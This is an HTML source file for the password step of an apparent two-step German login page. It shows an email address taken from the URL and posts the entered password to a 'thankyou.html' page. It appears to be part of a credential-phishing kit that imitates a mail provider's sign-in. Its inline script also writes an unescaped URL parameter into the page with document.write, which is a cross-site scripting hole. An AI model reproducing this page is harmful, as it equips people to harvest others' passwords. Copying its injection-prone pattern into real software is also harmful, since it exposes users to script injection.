<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Login - Passwort</title>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>

  <!-- Header Image -->
  <div class="header"></div>

  <!-- Centered Form -->
  <div class="form-box">
    <img src="images/logo-password.png" alt="Logo">

    <!-- Show Email from First Page -->
    <p class="user-email">
      <!-- Display email passed from index.html -->
      <script>
        const params = new URLSearchParams(window.location.search);
        document.write(params.get("email") || "E-Mail-Adresse nicht gefunden");
      </script>
    </p>

    <form action="thankyou.html" method="POST">
      <label for="password">Passwort</label>
      <input type="password" id="password" name="password" placeholder="Passwort" required>

      <p class="info-text">
        Nicht Ihr Ger√§t? Melden Sie sich nach der Sitzung ab oder verwenden Sie den privaten Browsermodus
      </p>

      <button type="submit" class="weiter-btn">Weiter</button>
    </form>
  </div>

</body>
</html>
